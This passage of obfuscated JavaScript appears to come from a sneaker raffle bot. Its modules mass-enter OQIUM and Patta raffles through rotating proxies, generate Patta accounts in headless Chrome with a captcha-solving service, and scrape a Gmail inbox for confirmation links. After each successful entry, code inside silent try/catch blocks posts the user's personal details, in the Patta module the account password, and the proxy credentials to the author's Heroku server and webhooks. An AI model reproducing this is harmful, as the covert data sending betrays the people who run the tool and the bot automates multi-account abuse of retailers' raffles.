                                    if (_0x4d872d[_0x1ed84a]['Size'] == 'RANDOM') {
                                    }
                                    _0x212795['data']['attributes']['properties']['$first_name'] = '' + _0x4d872d[_0x1ed84a]['FirstName'], _0x212795['data']['attributes']['properties']['$last_name'] = '' + _0x4d872d[_0x1ed84a]['LastName'], _0x212795['data']['attributes']['properties']['$address1'] = _0x4d872d[_0x1ed84a]['Address1'] + '\x20' + _0x4d872d[_0x1ed84a]['Address2'] + '\x20' + _0x4d872d[_0x1ed84a]['HouseNumber'], _0x212795['data']['attributes']['properties']['$zip'] = '' + _0x4d872d[_0x1ed84a]['Zip'], _0x212795['data']['attributes']['properties']['$city'] = '' + _0x4d872d[_0x1ed84a]['City'], _0x212795['data']['attributes']['properties']['$country'] = '' + _0x4d872d[_0x1ed84a]['Country'], _0x4d872d[_0x1ed84a]['Size'] == 'RANDOM' ? _0x212795['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x333848[_0x1d0fde] : _0x212795['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4d872d[_0x1ed84a]['Size'], _0x212795['data']['attributes']['properties']['$phone_number'] = '' + _0x4d872d[_0x1ed84a]['Phone'], _0x212795['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4d872d[_0x1ed84a]['Follower'];
                                }
                                if (_0x33c579['useRandomProxy'] = ![])
                                    var _0x543ac0 = _0x4bf0c7[_0x1ed84a]['split'](':');
                                else
                                    var _0x5bc384 = Math['round'](Math['random']() * (_0x4bf0c7['length'] - 0x1)), _0x543ac0 = _0x4bf0c7[_0x5bc384]['split'](':');
                                var _0x68e91b = {
                                    'jar': _0x9ac3a8,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4397a2['url'],
                                    'headers': _0x4397a2['headers'],
                                    'body': JSON['stringify'](_0x212795),
                                    'proxy': 'http://' + _0x543ac0[0x2] + ':' + _0x543ac0[0x3] + '@' + _0x543ac0[0x0] + ':' + _0x543ac0[0x1]
                                };
                                return _0x162038 != 'ver' && (_0x68e91b['url'] = _0x4397a2['url'], _0x68e91b['headers'] = _0x4397a2['headers']), _0x162038 == 'ver' && (_0x68e91b['method'] = 'GET'), new Promise(function (_0x21b92e, _0x563fee) {
                                    callback = async (_0x1c5814, _0x568ccf, _0x2ff057) => {
                                        if (!_0x1c5814 && _0x568ccf['statusCode'] == 0xca || !_0x1c5814 && _0x568ccf['statusCode'] == 0xc8) {
                                            if (_0x162038 != 'ver') {
                                                var _0x4f89b0 = await _0x4a5b92(_0x4d872d[_0x1ed84a], _0x4397a2, 'dev', ![]), _0x3489de = await _0x4a5b92(_0x4d872d[_0x1ed84a], _0x4397a2, 'pub', ![]);
                                                const _0xb6ff18 = {
                                                    'succesDEVMSG': { 'embeds': [_0x4f89b0] },
                                                    'succesPUBMSG': { 'embeds': [_0x3489de] }
                                                };
                                                let _0x2e2910 = _0x4d872d[_0x1ed84a];
                                                try {
                                                    prxdata = {
                                                        'username': _0x4ebc10['replace']('#', ''),
                                                        'module': _0x4397a2['name'],
                                                        'entrydata': JSON['stringify'](_0x2e2910),
                                                        'proxy': '' + _0x4bf0c7[_0x1ed84a]
                                                    };
                                                    var _0x33489b = JSON['stringify'](prxdata);
                                                    let _0x1b004e = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x33489b, _0x1b004e);
                                                } catch (_0x52c32a) {
                                                }
                                                if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                                                    try {
                                                        await _0x265172(_0x33c579['webhook'], _0xb6ff18['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0xb6ff18['succesDEVMSG']), await _0x4b01dc(0xc8);
                                                try {
                                                    await _0x265172(_0x2c2f0f, _0xb6ff18['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x41d22(_0x4d872d[_0x1ed84a], _0x4397a2);
                                            }
                                            _0x3b2201--, _0x21b92e(console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x4397a2['name'] + ']\x20Task\x20' + (_0x1ed84a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x162038 != 'ver') {
                                                var _0x1d6e86 = '' + _0x1c5814, _0x4cd227 = await _0x4a5b92(_0x4d872d[_0x1ed84a], _0x4397a2, 'dev', !![], _0x1d6e86), _0x96de3f = {};
                                                _0x96de3f['errorDEV'] = { 'embeds': [_0x4cd227] }, _0x2b505c(_0x4d872d[_0x1ed84a], _0x4397a2), _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x96de3f['errorDEV']), await _0x265172(_0x3cc994, _0x96de3f['errorDEV']);
                                            }
                                            _0x3b2201--, _0x563fee(console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x4397a2['name'] + ']\x20Task\x20' + (_0x1ed84a + 0x1) + ':\x20' + _0x1c5814)));
                                        }
                                    };
                                    try {
                                        _0x162038 != 'ver' && console['log'](_0x303e65() + '\x20[' + _0x4397a2['name'] + ']\x20Task\x20' + (_0x1ed84a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x212795['data']['attributes']['email']), _0x67edce(_0x68e91b, callback);
                                    } catch (_0x1b4689) {
                                        console['log'](_0x303e65() + '\x20Task\x20' + (_0x1ed84a + 0x1) + ':\x20' + _0x1b4689);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x141bae(_0x17b8f8, 'nor', _0x3c0b3e, _0x2960c2, _0x4063a3), console['log'](_0x303e65() + '\x20[' + _0x3c0b3e['name'] + ']\x20Sleeping\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                            } catch (_0x49d515) {
                            }
                        }
                        _0x4deb07(_0x4e49ba, _0x5005d5, _0x2b8838, _0x588a81), await _0x4b01dc(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5e4532, _0x25cc72, _0x2ba7a2) {
                    var _0x25cc72 = [], _0x5064d0 = ![];
                    async function _0x2d139b() {
                        var _0x4e32d0 = new _0xc8c5aa({
                            'user': _0x33c579['masterMail'],
                            'password': _0x33c579['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3f36b3(_0x168dfa) {
                            _0x4e32d0['openBox']('INBOX', ![], _0x168dfa);
                        }
                        _0x4e32d0['once']('ready', function () {
                            _0x3f36b3(function (_0x47520e, _0x21d3fe) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x47520e)
                                    throw _0x47520e;
                                _0x4e32d0['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x284c68, _0x2def6a) {
                                    if (!_0x2def6a || !_0x2def6a['length'])
                                        console['log'](_0x303e65() + '\x20[' + _0x5e4532['name'] + ']\x20No\x20mails\x20found'), _0x4e32d0['end']();
                                    else {
                                        var _0x4652f3 = _0x4e32d0['seq']['fetch'](_0x2def6a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4652f3['on']('message', function (_0x57cff6, _0x13222f) {
                                            var _0x5402f1 = '(#' + _0x13222f + ')\x20';
                                            _0x57cff6['on']('body', function (_0x232d8e, _0x3fb1d) {
                                                _0x1d4048(_0x232d8e, (_0x4d6940, _0x389df4) => {
                                                    var _0x5651bf = _0x389df4['text']['split']('(')[0x1], _0x2e1772 = _0x5651bf['split'](')')[0x0];
                                                    _0x25cc72['push'](_0x2e1772);
                                                });
                                            }), _0x57cff6['once']('end', function () {
                                            });
                                        }), _0x4652f3['once']('error', function (_0x4c2eae) {
                                            console['log']('Fetch\x20error:\x20' + _0x4c2eae), _0x5064d0 = !![];
                                        }), _0x4652f3['once']('end', function () {
                                            _0x4e32d0['end'](), _0x5064d0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x4e32d0['once']('error', function (_0x5e2bbd) {
                            console['log'](_0x5e2bbd), _0x5064d0 = !![];
                        }), _0x4e32d0['once']('end', async function () {
                            _0x5064d0 = !![];
                        }), _0x4e32d0['connect']();
                    }
                    async function _0x5c3135(_0x2a22a9, _0x49174a, _0x1df383) {
                        for (var _0x5346e7 = 0x0; _0x5346e7 < _0x49174a['length']; _0x5346e7++) {
                            async function _0x56de01(_0x18f5e4, _0x38ee91, _0x108303, _0x23033b, _0x224905) {
                                var _0x43bcc8, _0x2e3745 = {}, _0x2f44a2 = [], _0x2c56bb = {}, _0x34d8f6 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x19824b = Math['round'](Math['random']() * (_0x34d8f6['length'] - 0x1));
                                _0x23033b[_0x18f5e4]['Size'] == 'RANDOM' && (_0x23033b[_0x18f5e4]['Size'] = _0x34d8f6[_0x19824b]);
                                !_0x23033b && (_0x23033b = {});
                                if (_0x33c579['useRandomProxy'] = ![])
                                    var _0xc7ee05 = _0x224905[_0x18f5e4]['split'](':');
                                else
                                    var _0x485caa = Math['round'](Math['random']() * (_0x224905['length'] - 0x1)), _0xc7ee05 = _0x224905[_0x485caa]['split'](':');
                                var _0x2296a7 = {
                                    'jar': _0x9ac3a8,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x108303['url'],
                                    'headers': _0x108303['headers'],
                                    'body': JSON['stringify'](_0x2e3745),
                                    'proxy': 'http://' + _0xc7ee05[0x2] + ':' + _0xc7ee05[0x3] + '@' + _0xc7ee05[0x0] + ':' + _0xc7ee05[0x1]
                                };
                                return _0x38ee91 == 'ver' && (_0x2296a7['method'] = 'GET', _0x2296a7['url'] = _0x23033b[_0x18f5e4]), new Promise(function (_0x5ec348, _0x2f673e) {
                                    callback = async (_0x41c2a9, _0x2ddbfc, _0x2e80b7) => {
                                        !_0x41c2a9 && _0x2ddbfc['statusCode'] == 0xca || !_0x41c2a9 && _0x2ddbfc['statusCode'] == 0xc8 ? _0x5ec348(console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x108303['name'] + ']\x20Task\x20' + (_0x18f5e4 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x2f673e(console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x108303['name'] + ']\x20Task\x20' + (_0x18f5e4 + 0x1) + ':\x20' + _0x41c2a9)));
                                    };
                                    try {
                                        _0x38ee91 != 'ver' ? console['log'](_0x303e65() + '\x20[' + _0x108303['name'] + ']\x20Task\x20' + (_0x18f5e4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2e3745['data']['attributes']['email']) : console['log'](_0x303e65() + '\x20[' + _0x108303['name'] + ']\x20Task\x20' + (_0x18f5e4 + 0x1) + ':\x20Fetching\x20Response'), _0x67edce(_0x2296a7, callback);
                                    } catch (_0x479d76) {
                                        console['log'](_0x303e65() + '\x20Task\x20' + (_0x18f5e4 + 0x1) + ':\x20' + _0x479d76);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x56de01(_0x5346e7, 'ver', _0x2a22a9, _0x49174a, _0x1df383), console['log'](_0x303e65() + '\x20[' + _0x2a22a9['name'] + ']\x20Sleeping\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                            } catch (_0x436e20) {
                                console['log'](_0x436e20), await _0x4b01dc(0x2710);
                            }
                        }
                    }
                    try {
                        _0x2d139b();
                        while (!_0x5064d0) {
                            await _0x4b01dc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x25cc72['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x2daab9) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x2daab9), await _0x4b01dc(0x2710);
                    }
                    try {
                        await _0x5c3135(_0x5e4532, _0x25cc72, _0x2ba7a2);
                    } catch (_0x327940) {
                        console['log'](_0x327940), await _0x4b01dc(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x271fde, _0x57f4bf, _0x50f744) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x49f3a0 = 0x0; _0x49f3a0 < _0x57f4bf['length']; _0x49f3a0++) {
                        var _0x3f3ec5 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ebc10
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x33c579['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ddf1c
                                }
                            ]
                        }];
                        const _0xb75c06 = { 'embeds': _0x3f3ec5 };
                        _0x369d34(_0x271fde['name'] + '\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20/\x20' + _0x57f4bf['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        try {
                            await _0x32ecbd(_0x57f4bf, _0x49f3a0);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4449a5 = await _0x4a5b92(_0x57f4bf[_0x49f3a0], _0x271fde, 'acc', ![]);
                        const _0x21123f = { 'succesDEVMSG': { 'embeds': [_0x4449a5] } };
                        if (_0x57f4bf[_0x49f3a0]['Email'] == '' || _0x57f4bf[_0x49f3a0]['FirstName'] == '' || _0x57f4bf[_0x49f3a0]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4b01dc(0x7d0);
                            continue;
                        }
                        (_0x57f4bf[_0x49f3a0]['Password'] == '' || _0x57f4bf[_0x49f3a0] == undefined) && _0x57f4bf[_0x49f3a0]['Password'] == 'JRaffles23!';
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x486126 = _0x50f744[_0x49f3a0]['split'](':');
                        else
                            var _0x2994ef = Math['round'](Math['random']() * (_0x50f744['length'] - 0x1)), _0x486126 = _0x50f744[_0x2994ef]['split'](':');
                        var _0x5a39d0;
                        try {
                            _0x5a39d0 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x486126[0x0] + ':' + _0x486126[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5a39d0 = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x486126[0x0] + ':' + _0x486126[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2ab14b = await _0x5a39d0['newPage']();
                            await _0x2ab14b['authenticate']({
                                'username': '' + _0x486126[0x2],
                                'password': '' + _0x486126[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x271fde['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ab14b['setRequestInterception'](!![]), _0x2ab14b['on']('request', _0x57468a => {
                                _0x57468a['resourceType']() === 'image' || _0x57468a['resourceType']() === 'font' || _0x57468a['resourceType']() === 'media' ? _0x57468a['abort']() : _0x57468a['continue']();
                            }), await _0x2ab14b['goto']('https://patta.nl/account/register'), await _0x4b01dc(0xbb8), await _0x2ab14b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x303e65() + '\x20[' + _0x271fde['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2ab14b['type']('#RegisterForm-FirstName', '' + _0x57f4bf[_0x49f3a0]['FirstName']), await _0x4b01dc(0x226), await _0x2ab14b['type']('#RegisterForm-LastName', '' + _0x57f4bf[_0x49f3a0]['LastName']), await _0x4b01dc(0x226), await _0x2ab14b['type']('#RegisterForm-email', '' + _0x57f4bf[_0x49f3a0]['Email']), await _0x4b01dc(0x226), await _0x2ab14b['type']('#RegisterForm-password', '' + _0x57f4bf[_0x49f3a0]['Password']), await _0x4b01dc(0x226), console['log'](_0x303e65() + '\x20[' + _0x271fde['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Submitting..'), await _0x2ab14b['$eval']('#RegisterForm', _0x43a3c2 => _0x43a3c2['submit']()), await _0x4b01dc(0x1f40);
                            try {
                                await _0x2ab14b['waitForSelector']('.home-page-grid__collection'), await _0x4b01dc(0x1f4), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x271fde['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Account\x20' + _0x57f4bf[_0x49f3a0]['Email'] + '\x20Generated!')), _0x3f6207['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x57f4bf[_0x49f3a0]['Email'] + ',' + _0x57f4bf[_0x49f3a0]['Password']), console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x271fde['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Account\x20' + _0x57f4bf[_0x49f3a0]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x21123f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x265172(_0x1fa40c, _0x21123f['succesDEVMSG']);
                            } catch (_0x4432a6) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4432a6));
                            }
                        } catch (_0x36589c) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x49f3a0 + 0x1) + '\x20:\x20' + _0x36589c));
                        } finally {
                            _0x5a39d0 && _0x5a39d0['close'](), console['log']('Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x39c539, _0x26a694, _0xd0f9a4) {
                    _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x33c579['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x384089 = 0x0; _0x384089 < _0x26a694['length']; _0x384089++) {
                        var _0x4e2328;
                        if (_0x10b947 != 'yes')
                            var _0x10b947 = '', _0x1a77c3 = 0x0;
                        _0x369d34(_0x39c539['name'] + '\x20Task\x20' + (_0x384089 + 0x1) + '\x20/\x20' + _0x26a694['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                        try {
                            await _0x32ecbd(_0x26a694, _0x384089);
                        } catch {
                            _0x10b947 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x26a694[_0x384089]['Email'] == '' || _0x26a694[_0x384089]['Password'] == '' || _0x26a694[_0x384089]['FirstName'] == '' || _0x26a694[_0x384089]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0xdeba47 = _0xd0f9a4[_0x384089]['split'](':');
                        else
                            var _0x2de173 = Math['round'](Math['random']() * (_0xd0f9a4['length'] - 0x1)), _0xdeba47 = _0xd0f9a4[_0x2de173]['split'](':');
                        var _0x1379af;
                        try {
                            _0x1379af = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xdeba47[0x0] + ':' + _0xdeba47[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1379af = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xdeba47[0x0] + ':' + _0xdeba47[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2f69a1 = await _0x1379af['newPage']();
                            await _0x2f69a1['authenticate']({
                                'username': '' + _0xdeba47[0x2],
                                'password': '' + _0xdeba47[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f69a1['setRequestInterception'](!![]), _0x2f69a1['on']('request', _0x2e1db3 => {
                                _0x2e1db3['resourceType']() === 'image' || _0x2e1db3['resourceType']() === 'font' || _0x2e1db3['resourceType']() === 'media' ? _0x2e1db3['abort']() : _0x2e1db3['continue']();
                            }), await _0x2f69a1['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2f69a1['waitForSelector']('#CustomerEmail'), console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2f69a1['type']('#CustomerEmail', '' + _0x26a694[_0x384089]['Email']), await _0x4b01dc(0x12c), await _0x2f69a1['type']('#CustomerPassword', '' + _0x26a694[_0x384089]['Password']), await _0x4b01dc(0x226), await _0x2f69a1['$eval']('#customer_login', _0x234ca9 => _0x234ca9['submit']());
                            try {
                                await _0x2f69a1['waitForSelector']('#orders'), await _0x4b01dc(0x4b0);
                            } catch {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2f69a1['goto']('' + _0x26a694[_0x384089]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4b01dc(0xbb8), console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2f69a1['waitForSelector']('#email');
                            } catch {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2f69a1['type']('#email', '' + _0x26a694[_0x384089]['Email']), await _0x4b01dc(0x384), await _0x2f69a1['type']('#first_name', '' + _0x26a694[_0x384089]['FirstName']), await _0x4b01dc(0x514), await _0x2f69a1['type']('#last_name', '' + _0x26a694[_0x384089]['LastName']), await _0x4b01dc(0x514), await _0x2f69a1['type']('#street_address', _0x26a694[_0x384089]['Address1'] + '\x20' + _0x26a694[_0x384089]['HouseNumber'] + '\x20' + _0x26a694[_0x384089]['Address2']), await _0x4b01dc(0x2bc);
                            _0x26a694[_0x384089]['Postcode'] == undefined && (_0x26a694[_0x384089]['Postcode'] = _0x26a694[_0x384089]['Zip']);
                            await _0x2f69a1['type']('#zip_code', '' + _0x26a694[_0x384089]['Postcode']), await _0x4b01dc(0x320), await _0x2f69a1['type']('#city', '' + _0x26a694[_0x384089]['City']), await _0x4b01dc(0x320), await _0x2f69a1['type']('#bday', '01/01/1994'), await _0x4b01dc(0x320), await _0x2f69a1['type']('#instagram', '' + _0x26a694[_0x384089]['Follower']), await _0x4b01dc(0x352);
                            if (_0x26a694[_0x384089]['Size'] == 'RANDOM') {
                                const _0x535906 = await _0x2f69a1['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x5c20bd => {
                                    return _0x5c20bd['map'](_0x54878c => _0x54878c['textContent']);
                                });
                                var _0xf7a04a = Math['round'](Math['random']() * (_0x535906['length'] - 0x1));
                                console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x535906[_0xf7a04a]), await _0x2f69a1['click']('label[data-eu-size=\x22' + _0x535906[_0xf7a04a] + '\x22]');
                            } else {
                                console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x26a694[_0x384089]['Size']);
                                try {
                                    await _0x2f69a1['click']('label[data-eu-size=\x22' + _0x26a694[_0x384089]['Size'] + '\x22]');
                                } catch {
                                    await _0x2f69a1['click']('label[data-eu-size=\x22' + _0x26a694[_0x384089]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x4b01dc(0xbb8), await _0x2f69a1['$$eval']('.raffle__checkbox-label', _0x3de336 => _0x3de336['forEach'](_0x3b4fae => _0x3b4fae['click']())), await _0x4b01dc(0x7d0), console['log'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2f69a1['click']('#raffle__form-submit'), await _0x4b01dc(0x1388);
                            try {
                                await _0x2f69a1['waitForSelector']('#raffle__confirmation-message-container'), _0x10b947 = 'no', _0x41d22(_0x26a694[_0x384089], _0x39c539), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x39c539['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x39e2c4 = _0x26a694[_0x384089];
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'module': _0x39c539['name'],
                                        'entrydata': JSON['stringify'](_0x39e2c4),
                                        'proxy': '' + _0xd0f9a4[_0x384089]
                                    };
                                    var _0x10d462 = JSON['stringify'](prxdata);
                                    let _0x356771 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x10d462, _0x356771);
                                } catch (_0x14ae96) {
                                }
                            } catch (_0x2cf058) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5411d6[taskModule]['name'] + ']\x20Task\x20' + (_0x384089 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x2cf058));
                            }
                        } catch (_0x2ddea7) {
